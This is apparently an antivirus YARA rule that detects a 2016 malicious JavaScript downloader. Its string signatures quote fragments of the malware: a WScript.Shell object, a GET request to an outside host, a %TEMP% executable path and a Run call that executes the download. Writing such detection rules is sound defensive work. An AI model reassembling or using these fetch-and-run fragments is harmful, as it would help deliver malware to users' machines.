rule sig_20160328_9c3a24a7c43949b19e97785489d2be9d {
  meta:
    description = "datamaliciousorder - file 20160328_9c3a24a7c43949b19e97785489d2be9d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6a31a34d84d8d5fbbf0b82d37ae017e77746f5e6f3b92e6c7c9671c6e5d67f19"

  strings:
    $s1  = "function Xyqiuhqo() {return Jzjohn[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"OFMu7wgo3a1jwx37.exe\";};" fullword ascii
    $s2  = "Qpxuonopli[Qaghtkx](\"GET\", \"http://2biking.com/k4isfa\", false);" fullword ascii
    $s3  = "do {WScript[Edqkvwglco](Igokukched() * 11)} while (Qpxuonopli[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Hfxdifud(Nqcxn, Hyeguslz){return Nqcxn - Hyeguslz;};" fullword ascii
    $s5  = "var Jzjohn = function Dffjp() {return WScript[Gwcrcqc](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Pftprldufa(Wtamqo) {var Hcudlah = (1, 2, 3, 4, 5, Wtamqo); return Hcudlah;};" fullword ascii
    $s7  = "var Hhybinbyvw = false;" fullword ascii
    $s8  = "function Uxkweheune(Fylsm){Jzjohn[\"Run\"](Fylsm, Clrbc, Clrbc);};" fullword ascii
    $s9  = "function Pjrmola() {return ((Vnyaoxbl == true) && (Vnyaoxbl == Hckrjr)) ? 1 : Clrbc;};" fullword ascii
    $s10 = "var Eukre = new this[\"Date\"]();" fullword ascii
    $s11 = "Hckrjr = true; " fullword ascii
    $s12 = " while (Cslzndes){" fullword ascii
    $s13 = "var Vnyaoxbl = false;" fullword ascii
    $s14 = "Vnyaoxbl = true; " fullword ascii
    $s15 = "function Jspzjhm(){return Gwcrcqc;};" fullword ascii
    $s16 = "return Hfxdifud(Zfzmur, Mmzor);" fullword ascii
    $s17 = "function Igokukched(){return 22;};" fullword ascii
    $s18 = "function Halhuy()" fullword ascii
    $s19 = "function Fzvpozemo(){return Fapuhunxp;};" fullword ascii
    $s20 = "var Hckrjr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}